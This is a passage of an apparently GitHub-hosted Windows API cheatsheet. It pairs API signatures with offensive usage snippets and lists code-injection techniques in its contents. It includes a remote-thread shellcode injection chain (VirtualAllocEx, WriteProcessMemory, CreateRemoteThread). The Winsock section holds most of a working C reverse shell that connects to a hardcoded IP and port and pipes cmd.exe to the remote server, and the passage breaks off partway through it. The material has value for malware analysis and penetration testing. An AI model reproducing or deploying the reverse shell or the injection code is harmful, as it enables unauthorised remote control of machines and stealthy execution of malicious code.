<div align="center">
  
![API CheatSheets](https://github.com/7etsuo/windows-api-function-cheatsheets/assets/90065760/5cd8aa72-377b-4163-8ec9-0046bdacd5eb)

</div>

<div align="center">
  
# Windows API Function Cheatsheets
<h3>Contact</h3>

🌨️ Tetsuo: https://www.x.com/tetsuo
 </div>

## Table of Contents

- [Windows API Function Cheatsheets](#windows-api-function-cheatsheets)
    - [File Operations](#file-operations)
    - [Process Management](#process-management)
    - [Memory Management](#memory-management)
    - [Thread Management](#thread-management)
    - [Dynamic-Link Library (DLL) Management](#dynamic-link-library-dll-management)
    - [Synchronization](#synchronization)
    - [Interprocess Communication](#interprocess-communication)
    - [Windows Hooks](#windows-hooks)
    - [Cryptography](#cryptography)
    - [Debugging](#debugging)
    - [Winsock](#winsock)
    - [Registry Operations](#registry-operations)
    - [Error Handling](#error-handling)
    - [Resource Management](#resource-management)
  - [Unicode String Functions](#unicode-string-functions)
    - [String Length](#string-length)
    - [String Copy](#string-copy)
    - [String Concatenation](#string-concatenation)
    - [String Comparison](#string-comparison)
    - [String Search](#string-search)
    - [Character Classification and Conversion](#character-classification-and-conversion)
  - [Win32 Structs Cheat Sheet](#win32-structs-cheat-sheet)
    - [Common Structs](#common-structs)
    - [Win32 Sockets Structs Cheat Sheet (winsock.h)](#win32-sockets-structs-cheat-sheet-winsockh)
    - [Win32 Sockets Structs Cheat Sheet (winsock2.h)](#win32-sockets-structs-cheat-sheet-winsock2h)
    - [Win32 Sockets Structs Cheat Sheet (ws2def.h)](#win32-sockets-structs-cheat-sheet-ws2defh)
- [Code Injection Techniques](#code-injection-techniques)
  - [1. DLL Injection](#1-dll-injection)
  - [2. PE Injection](#2-pe-injection)
  - [3. Reflective Injection](#3-reflective-injection)
  - [4. APC Injection](#4-apc-injection)
  - [5. Process Hollowing (Process Replacement)](#5-process-hollowing-process-replacement)
  - [6. AtomBombing](#6-atombombing)
  - [7. Process Doppelgänging](#7-process-doppelgänging)
  - [8. Process Herpaderping](#8-process-herpaderping)
  - [9. Hooking Injection](#9-hooking-injection)
  - [10. Extra Windows Memory Injection](#10-extra-windows-memory-injection)
  - [11. Propagate Injection](#11-propagate-injection)
  - [12. Heap Spray](#12-heap-spray)
  - [13. Thread Execution Hijacking](#13-thread-execution-hijacking)
  - [14. Module Stomping](#14-module-stomping)
  - [15. IAT Hooking](#15-iat-hooking)
  - [16. Inline Hooking](#16-inline-hooking)
  - [17. Debugger Injection](#17-debugger-injection)
  - [18. COM Hijacking](#18-com-hijacking)
  - [19. Phantom DLL Hollowing](#19-phantom-dll-hollowing)
  - [20. PROPagate](#20-propagate)
  - [21. Early Bird Injection](#21-early-bird-injection)
  - [22. Shim-based Injection](#22-shim-based-injection)
  - [23. Mapping Injection](#23-mapping-injection)
  - [24. KnownDlls Cache Poisoning](#24-knowndlls-cache-poisoning)
- [Process Enumeration](#process-enumeration)

## Windows API Function Calls
### File Operations
[CreateFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
```c
HANDLE CreateFile(
  LPCTSTR lpFileName,
  DWORD dwDesiredAccess,
  DWORD dwShareMode,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  DWORD dwCreationDisposition,
  DWORD dwFlagsAndAttributes,
  HANDLE hTemplateFile
); // Opens an existing file or creates a new file.
```
[ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile)
```c
BOOL ReadFile(
  HANDLE hFile,
  LPVOID lpBuffer,
  DWORD nNumberOfBytesToRead,
  LPDWORD lpNumberOfBytesRead,
  LPOVERLAPPED lpOverlapped
); // Reads data from the specified file.
```
[WriteFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)
```c
BOOL WriteFile(
  HANDLE hFile,
  LPCVOID lpBuffer,
  DWORD nNumberOfBytesToWrite,
  LPDWORD lpNumberOfBytesWritten,
  LPOVERLAPPED lpOverlapped
); // Writes data to the specified file.
```
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
```c
BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
```

### Process Management
[OpenProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
); // Opens an existing local process object. e.g., try to open target process
```
```c
hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) pid);
```
[CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
```c
HANDLE CreateProcess(
  LPCTSTR lpApplicationName,
  LPTSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCTSTR lpCurrentDirectory,
  LPSTARTUPINFO lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
); // The CreateProcess function creates a new process that runs independently of the creating process. For simplicity, this relationship is called a parent-child relationship.
```
```c
// Start the child process
// No module name (use command line), Command line, Process handle not inheritable, Thread handle not inheritable, Set handle inheritance to FALSE, No creation flags, Use parent's environment block, Use parent's starting directory, Pointer to STARTUPINFO structure, Pointer to PROCESS_INFORMATION structure
CreateProcess( NULL, argv[1], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); 
```
[WinExec](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)
```c
UINT WinExec(
  [in] LPCSTR lpCmdLine,
  [in] UINT   uCmdShow
); // Runs the specified application.
```
```c
result = WinExec(L"C:\\Windows\\System32\\cmd.exe", SW_SHOWNORMAL);
```
[TerminateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess)
```c
BOOL TerminateProcess(
  HANDLE hProcess,
  UINT uExitCode
); // Terminates the specified process.
```
[ExitWindowsEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-exitwindowsex)
```c
BOOL ExitWindowsEx(
  [in] UINT  uFlags,
  [in] DWORD dwReason
); // Logs off the interactive user, shuts down the system, or shuts down and restarts the system.
```
```c
bResult = ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_APPLICATION);
```
[CreateToolhelp32Snapshot](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
```c
HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,
  [in] DWORD th32ProcessID
); // used to obtain information about processes and threads running on a Windows system.
```
[Process32First](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
```c
BOOL Process32First(
  [in]      HANDLE           hSnapshot,
  [in, out] LPPROCESSENTRY32 lppe
); // used to retrieve information about the first process encountered in a system snapshot, which is typically taken using the CreateToolhelp32Snapshot function.
```
[Process32Next](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
```c
BOOL Process32Next(
  [in]  HANDLE           hSnapshot,
  [out] LPPROCESSENTRY32 lppe
); // used to retrieve information about the next process in a system snapshot after Process32First has been called. This function is typically used in a loop to enumerate all processes captured in a snapshot taken using the CreateToolhelp32Snapshot function.
```
[WriteProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
); // Writes data to an area of memory in a specified process. The entire area to be written to must be accessible or the operation fails.
```
```c
WriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL); // pRemoteCode from VirtualAllocEx
```
[ReadProcessMemory](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory)
```c
BOOL ReadProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPCVOID lpBaseAddress,
  [out] LPVOID  lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesRead
); // ReadProcessMemory copies the data in the specified address range from the address space of the specified process into the specified buffer of the current process.
```
```c
bResult = ReadProcessMemory(pHandle, (void*)baseAddress, &address, sizeof(address), 0);
```

### Memory Management
[VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
```c
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,                // Shellcode must be between 0x1 and 0x10000 bytes (page size)
  DWORD flAllocationType,       // #define MEM_COMMIT 0x00001000
  DWORD flProtect               // #define PAGE_EXECUTE_READWRITE 0x00000040  
); // Reserves, commits, or changes the state of a region of memory within the virtual address space of the calling process.
```
[VirtualAllocEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
); // Reserves, commits, or changes the state of a region of memory within the virtual address space of a specified process. The function initializes the memory it allocates to zero.
```
```c
pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
```
[VirtualFree](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree)
```c
BOOL VirtualFree(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD dwFreeType
); // Releases, decommits, or releases and decommits a region of memory within the virtual address space of the calling process.
```
[VirtualProtect function (memoryapi.h)](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
```c
BOOL VirtualProtect(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flNewProtect,
  PDWORD lpflOldProtect
); // Changes the protection on a region of committed pages in the virtual address space of the calling process.
```
[RtlMoveMemory](https://learn.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory)
```c
VOID RtlMoveMemory(
  _Out_       VOID UNALIGNED *Destination,
  _In_  const VOID UNALIGNED *Source,
  _In_        SIZE_T         Length
); // Copies the contents of a source memory block to a destination memory block, and supports overlapping source and destination memory blocks.
```

### Thread Management
[CreateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread)
```c
HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,         // A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new thread and determines whether child processes can inherit the returned handle.
  [in]            SIZE_T                  dwStackSize,                // The initial size of the stack, in bytes.
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,             // A pointer to the application-defined function of type LPTHREAD_START_ROUTINE
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,                // A pointer to a variable to be passed to the thread function.
  [in]            DWORD                   dwCreationFlags,            // The flags that control the creation of the thread.
  [out, optional] LPDWORD                 lpThreadId                  // A pointer to a variable that receives the thread identifier. If this parameter is NULL, the thread identifier is not returned.
); // Creates a thread to execute within the virtual address space of the calling process.
```
```c
th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0); WaitForSingleObject(th, 0);
```
[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
```c
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
); // Creates a thread that runs in the virtual address space of another process.
```
```c
hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory
```
[CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)
```c
HANDLE CreateRemoteThreadEx(
  [in]            HANDLE                       hProcess,
  [in, optional]  LPSECURITY_ATTRIBUTES        lpThreadAttributes,
  [in]            SIZE_T                       dwStackSize,
  [in]            LPTHREAD_START_ROUTINE       lpStartAddress,
  [in, optional]  LPVOID                       lpParameter,
  [in]            DWORD                        dwCreationFlags,
  [in, optional]  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  [out, optional] LPDWORD                      lpThreadId
); // Creates a thread that runs in the virtual address space of another process and optionally specifies extended attributes such as processor group affinity.
   // See InitializeProcThreadAttributeList
```
```c
hThread = CreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, lpAttributeList, NULL); // pRemoteCode from VirtualAllocEx filled by WriteProcessMemory
```
[ExitThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread)
```c
VOID ExitThread(
  DWORD dwExitCode
); // Terminates the calling thread and returns the exit code to the operating system.
```
[GetExitCodeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getexitcodethread)
```c
BOOL GetExitCodeThread(
  HANDLE hThread,
  LPDWORD lpExitCode
); // Retrieves the termination status of the specified thread.
```
[ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
```c
DWORD ResumeThread(
  HANDLE hThread
); // Decrements a thread's suspend count. When the suspend count is decremented to zero, the execution of the thread is resumed.
```
[SuspendThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)
```c
DWORD SuspendThread(
  HANDLE hThread
); // Suspends the specified thread.
```
[TerminateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminatethread)
```c
BOOL TerminateThread(
  HANDLE hThread,
  DWORD dwExitCode
); // Terminates the specified thread.
```
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
```c
BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
```

### Dynamic-Link Library (DLL) Management
[LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
```c
HMODULE LoadLibrary(
  LPCTSTR lpFileName
); // Loads a dynamic-link library (DLL) module into the address space of the calling process.
```
[LoadLibraryExA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa)
```c
HMODULE LoadLibraryExA(
  [in] LPCSTR lpLibFileName,
       HANDLE hFile,
  [in] DWORD  dwFlags
); // Loads the specified module into the address space of the calling process, with additional options.
```
```c
HMODULE hModule = LoadLibraryExA("ws2_32.dll", NULL, LOAD_LIBRARY_SAFE_CURRENT_DIRS);
```
[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
```c
FARPROC GetProcAddress(
  HMODULE hModule,
  LPCSTR lpProcName
); // Retrieves the address of an exported function or variable from the specified DLL.
```
```c
pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
```

[FreeLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-freelibrary)
```c
BOOL FreeLibrary(
  HMODULE hModule
); // Frees the loaded DLL module and, if necessary, decrements its reference count.
```

### Synchronization
[CreateMutex](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createmutexa)
```c
HANDLE CreateMutex(
  LPSECURITY_ATTRIBUTES lpMutexAttributes,
  BOOL bInitialOwner,
  LPCTSTR lpName
); // Creates a named or unnamed mutex object.
```
[CreateSemaphore](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-createsemaphorea)
```c
HANDLE CreateSemaphore(
  LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,
  LONG lInitialCount,
  LONG lMaximumCount,
  LPCTSTR lpName
); // Creates a named or unnamed semaphore object.
```
[ReleaseMutex](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-releasemutex)
```c
BOOL ReleaseMutex(
  HANDLE hMutex
); // Releases ownership of the specified mutex object.
```
[ReleaseSemaphore](https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-releasesemaphore)
```c
BOOL ReleaseSemaphore(
  HANDLE hSemaphore,
  LONG lReleaseCount,
  LPLONG lpPreviousCount
); // Increases the count of the specified semaphore object by a specified amount.
```
[WaitForSingleObject](https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject)
```c
DWORD WaitForSingleObject(
  [in] HANDLE hHandle,
  [in] DWORD  dwMilliseconds
); // Waits until the specified object is in the signaled state or the time-out interval elapses.
```
```c
WaitForSingleObject(hThread, 500);
```

### Interprocess Communication
[CreatePipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
```c
BOOL CreatePipe(
  PHANDLE hReadPipe,
  PHANDLE hWritePipe,
  LPSECURITY_ATTRIBUTES lpPipeAttributes,
  DWORD nSize
); // Creates an anonymous pipe and returns handles to the read and write ends of the pipe.
```
[CreateNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
```c
HANDLE CreateNamedPipe(
  LPCTSTR lpName,
  DWORD dwOpenMode,
  DWORD dwPipeMode,
  DWORD nMaxInstances,
  DWORD nOutBufferSize,
  DWORD nInBufferSize,
  DWORD nDefaultTimeOut,
  LPSECURITY_ATTRIBUTES lpSecurityAttributes
); // Creates a named pipe and returns a handle for subsequent pipe operations.
```
[ConnectNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe)
```c
BOOL ConnectNamedPipe(
  HANDLE hNamedPipe,
  LPOVERLAPPED lpOverlapped
); // Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe.
```
[DisconnectNamedPipe](https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-disconnectnamedpipe)
```c
BOOL DisconnectNamedPipe(
  HANDLE hNamedPipe
); // Disconnects the server end of a named pipe instance from a client process.
```
[CreateFileMapping](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga)
```c
HANDLE CreateFileMapping(
  HANDLE hFile,
  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  DWORD flProtect,
  DWORD dwMaximumSizeHigh,
  DWORD dwMaximumSizeLow,
  LPCTSTR lpName
); // Creates or opens a named or unnamed file mapping object for a specified file.
```
[MapViewOfFile](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)
```c
LPVOID MapViewOfFile(
  HANDLE hFileMappingObject,
  DWORD dwDesiredAccess,
  DWORD dwFileOffsetHigh,
  DWORD dwFileOffsetLow,
  SIZE_T dwNumberOfBytesToMap
); // Maps a view of a file mapping into the address space of the calling process.
```
[UnmapViewOfFile](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-unmapviewoffile)
```c
BOOL UnmapViewOfFile(
  LPCVOID lpBaseAddress
); // Unmaps a mapped view of a file from the calling process's address space.
```
[CloseHandle](https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle)
```c
BOOL CloseHandle(
  HANDLE hObject
); // Closes an open handle.
```

### Windows Hooks
[SetWindowsHookExA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
```c
HHOOK SetWindowsHookExA(
  [in] int       idHook,
  [in] HOOKPROC  lpfn,
  [in] HINSTANCE hmod,
  [in] DWORD     dwThreadId
); // Installs an application-defined hook procedure into a hook chain. You would install a hook procedure to monitor the system for certain types of events. These events are associated either with a specific thread or with all threads in the same desktop as the calling thread.
```
[CallNextHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-callnexthookex)
```c
LRESULT CallNextHookEx(
  [in, optional] HHOOK  hhk,
  [in]           int    nCode,
  [in]           WPARAM wParam,
  [in]           LPARAM lParam
); // Passes the hook information to the next hook procedure in the current hook chain. A hook procedure can call this function either before or after processing the hook information.
```
[UnhookWindowsHookEx](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-unhookwindowshookex)
```c
BOOL UnhookWindowsHookEx(
  [in] HHOOK hhk
); // Removes a hook procedure installed in a hook chain by the SetWindowsHookEx function.
```
[GetAsyncKeyState](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate)
```c
SHORT GetAsyncKeyState(
  [in] int vKey
); // Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState.
```
[GetKeyState](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate)
```c
SHORT GetKeyState(
  [in] int nVirtKey
); // Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled (on, off—alternating each time the key is pressed).
```
[GetKeyboardState](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate)
```c
BOOL GetKeyboardState(
  [out] PBYTE lpKeyState
); // Copies the status of the 256 virtual keys to the specified buffer.
```

### Cryptography
[CryptBinaryToStringA](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptbinarytostringa)
```c
BOOL CryptBinaryToStringA(
  [in]            const BYTE *pbBinary,
  [in]            DWORD      cbBinary,
  [in]            DWORD      dwFlags,
  [out, optional] LPSTR      pszString,
  [in, out]       DWORD      *pcchString
); // The CryptBinaryToString function converts an array of bytes into a formatted string.
```
[CryptDecrypt](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt)
```c
BOOL CryptDecrypt(
  [in]      HCRYPTKEY  hKey,
  [in]      HCRYPTHASH hHash,
  [in]      BOOL       Final,
  [in]      DWORD      dwFlags,
  [in, out] BYTE       *pbData,
  [in, out] DWORD      *pdwDataLen
); // The CryptDecrypt function decrypts data previously encrypted by using the CryptEncrypt function.
```
[CryptEncrypt](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptencrypt)
```c
BOOL CryptEncrypt(
  [in]      HCRYPTKEY  hKey,
  [in]      HCRYPTHASH hHash,
  [in]      BOOL       Final,
  [in]      DWORD      dwFlags,
  [in, out] BYTE       *pbData,
  [in, out] DWORD      *pdwDataLen,
  [in]      DWORD      dwBufLen
); // The CryptEncrypt function encrypts data. The algorithm used to encrypt the data is designated by the key held by the CSP module and is referenced by the hKey parameter.
```
[CryptDecryptMessage](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecryptmessage)
```c
BOOL CryptDecryptMessage(
  [in]                PCRYPT_DECRYPT_MESSAGE_PARA pDecryptPara,
  [in]                const BYTE                  *pbEncryptedBlob,
  [in]                DWORD                       cbEncryptedBlob,
  [out, optional]     BYTE                        *pbDecrypted,
  [in, out, optional] DWORD                       *pcbDecrypted,
  [out, optional]     PCCERT_CONTEXT              *ppXchgCert
); // The CryptDecryptMessage function decodes and decrypts a message.
```
[CryptEncryptMessage]()
```c
BOOL CryptEncryptMessage(
  [in]      PCRYPT_ENCRYPT_MESSAGE_PARA pEncryptPara,
  [in]      DWORD                       cRecipientCert,
  [in]      PCCERT_CONTEXT []           rgpRecipientCert,
  [in]      const BYTE                  *pbToBeEncrypted,
  [in]      DWORD                       cbToBeEncrypted,
  [out]     BYTE                        *pbEncryptedBlob,
  [in, out] DWORD                       *pcbEncryptedBlob
); // The CryptEncryptMessage function encrypts and encodes a message.
```

### Debugging
[IsDebuggerPresent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)
```c
BOOL IsDebuggerPresent(); // Determines whether the calling process is being debugged by a user-mode debugger.
```
[CheckRemoteDebuggerPresent](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent)
```c
BOOL CheckRemoteDebuggerPresent(
  [in]      HANDLE hProcess,
  [in, out] PBOOL  pbDebuggerPresent
); // Determines whether the specified process is being debugged.
```
[OutputDebugStringA](https://learn.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-outputdebugstringa)
```c
void OutputDebugStringA(
  [in, optional] LPCSTR lpOutputString
); // Sends a string to the debugger for display.
```

### Winsock
```c
/*** Windows Reverse Shell
 * 
 *   ██████  ███▄    █  ▒█████   █     █░ ▄████▄   ██▀███   ▄▄▄        ██████  ██░ ██
 * ▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░▒██▀ ▀█  ▓██ ▒ ██▒▒████▄    ▒██    ▒ ▓██░ ██▒
 * ░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ ▒▓█    ▄ ▓██ ░▄█ ▒▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░
 *   ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ ▒▓▓▄ ▄██▒▒██▀▀█▄  ░██▄▄▄▄██   ▒   ██▒░▓█ ░██
 * ▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ ▒ ▓███▀ ░░██▓ ▒██▒ ▓█   ▓██▒▒██████▒▒░▓█▒░██▓
 * ▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
 * ░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░    ░  ▒     ░▒ ░ ▒░  ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░
 * ░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  ░          ░░   ░   ░   ▒   ░  ░  ░   ░  ░░ ░
 *       ░           ░     ░ ░      ░    ░ ░         ░           ░  ░      ░   ░  ░  ░
 *                                   Written by: snowcra5h@icloud.com (snowcra5h) 2023
 *
 * This program establishes a reverse shell via the Winsock2 library. It is
 * designed to establish a connection to a specified remote server, and execute commands
 * received from the server on the local machine, giving the server
 * control over the local machine.
 *
 * Compile command (using MinGW on Wine):
 * wine gcc.exe windows.c -o windows.exe -lws2_32
 *
 * This code is intended for educational and legitimate penetration testing purposes only.
 * Please use responsibly and ethically.
 *
 */

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <windows.h>
#include <process.h>

const char* const PORT = "1337";
const char* const IP = "10.37.129.2";

typedef struct {
    HANDLE hPipeRead;
    HANDLE hPipeWrite;
    SOCKET sock;
} ThreadParams;

DWORD WINAPI OutputThreadFunc(LPVOID data);
DWORD WINAPI InputThreadFunc(LPVOID data);
void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock);

int main(int argc, char** argv) {
    WSADATA wsaData;
    int err = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (err != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", err);
        return 1;
    }

    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, WSA_FLAG_OVERLAPPED);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "Socket function failed with error = %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    struct addrinfo hints = { 0 };
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    struct addrinfo* result;
    err = getaddrinfo(IP, PORT, &hints, &result);
    if (err != 0) {
        fprintf(stderr, "Failed to get address info: %d\n", err);
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    if (WSAConnect(sock, result->ai_addr, (int)result->ai_addrlen, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        fprintf(stderr, "Failed to connect.\n");
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hInputWrite, hOutputRead, hInputRead, hOutputWrite;
    if (!CreatePipe(&hOutputRead, &hOutputWrite, &sa, 0) || !CreatePipe(&hInputRead, &hInputWrite, &sa, 0)) {
        fprintf(stderr, "Failed to create pipe.\n");
        CleanUp(NULL, NULL, NULL, NULL, { 0 }, result, sock);
        return 1;
    }

    STARTUPINFO startupInfo = { 0 };
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = hInputRead;
    startupInfo.hStdOutput = hOutputWrite;
    startupInfo.hStdError = hOutputWrite;
    PROCESS_INFORMATION processInfo;

    WCHAR cmd[] = L"cmd.exe /k";
    if (!CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        fprintf(stderr, "Failed to create process.\n");
        CleanUp(hInputWrite, hInputRead, hOutputWrite, hOutputRead, processInfo, result, sock);
        return 1;
    }

    CloseHandle(hInputRead);
    CloseHandle(hOutputWrite);
